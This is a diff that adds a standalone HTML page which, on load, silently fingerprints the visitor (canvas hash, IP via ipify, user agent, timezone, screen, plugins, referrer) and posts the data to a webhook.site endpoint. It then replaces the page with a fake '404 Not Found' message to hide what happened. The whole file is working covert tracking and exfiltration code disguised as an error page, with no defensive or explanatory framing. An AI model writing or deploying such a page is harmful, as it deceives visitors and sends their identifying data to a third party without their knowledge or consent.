@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script>
+        const WEBHOOK_URL = "https://webhook.site/98bd2ce5-0545-4bb9-b65d-8a17230f7008";
+
+        async function sendData(data) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {}
+        }
+
+        async function collect() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(0, 0, 100, 50);
+            ctx.fillStyle = "#069";
+            ctx.fillText("Ryzen", 2, 15);
+            const canvasFingerprint = canvas.toDataURL();
+
+            let ip = "unavailable";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                ip = json.ip;
+            } catch(e) {}
+
+            const data = {
+                timestamp: new Date().toISOString(),
+                ip: ip,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                touchSupport: 'ontouchstart' in window,
+                referrer: document.referrer || "direct",
+                url: window.location.href,
+                canvasFingerprint: canvasFingerprint.substring(0, 200),
+                plugins: Array.from(navigator.plugins || []).slice(0,5).map(p => p.name).join(", ")
+            };
+
+            await sendData(data);
+
+            document.body.innerHTML = `
+                <style>body{background:#f0f0f0;font-family:monospace;text-align:center;padding:50px}</style>
+                <h1>404 Not Found</h1>
+                <p>The requested resource was not found on this server.</p>
+            `;
+        }
+
+        collect();
+    </script>
+</head>
+<body>Loading...</body>
+</html>
